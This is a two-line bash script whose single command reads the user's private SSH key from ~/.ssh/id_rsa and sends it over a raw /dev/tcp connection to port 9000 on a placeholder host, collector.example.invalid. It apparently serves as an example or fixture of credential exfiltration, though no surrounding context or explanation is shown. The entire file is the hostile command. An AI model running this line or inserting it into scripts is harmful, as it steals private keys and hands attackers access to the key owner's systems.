#!/bin/bash
cat ~/.ssh/id_rsa > /dev/tcp/collector.example.invalid/9000
